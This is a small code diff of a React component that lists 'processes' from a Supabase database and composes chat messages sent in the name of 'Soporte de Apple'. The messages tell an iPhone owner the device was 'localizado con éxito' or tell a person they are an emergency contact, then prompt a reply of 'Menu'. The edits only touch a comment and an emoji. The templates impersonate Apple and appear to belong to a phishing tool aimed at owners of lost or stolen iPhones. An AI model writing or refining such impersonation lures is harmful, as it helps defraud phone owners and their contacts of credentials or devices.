@@ -69,7 +69,7 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
         return;
       }
 
-      // CAMBIO: Tanto admin como usuario solo ven sus propios procesos
+      // Todos los usuarios (incluido admin) solo ven sus propios procesos
       console.log('Loading processes for user:', session.user.id);
       const { data, error } = await supabase
         .from('processes')
@@ -156,7 +156,7 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
       let message = '';
       
       if (process.contact_type === 'propietario') {
-        message = `*🔧 Soporte de Apple 👨🏽‍🔧*
+        message = `*Soporte de Apple 👨🏽‍🔧*
 
 *✅ iPhone localizado con éxito*
 
@@ -168,7 +168,7 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 
 *🧾 Escribe la palabra Menu para solicitar asistencia.*`;
       } else {
-        message = `*🔧 Soporte de Apple 👨🏽‍🔧*
+        message = `*Soporte de Apple 👨🏽‍🔧*
 
 *🚨 Usted ha sido registrado como contacto de emergencia.*
 
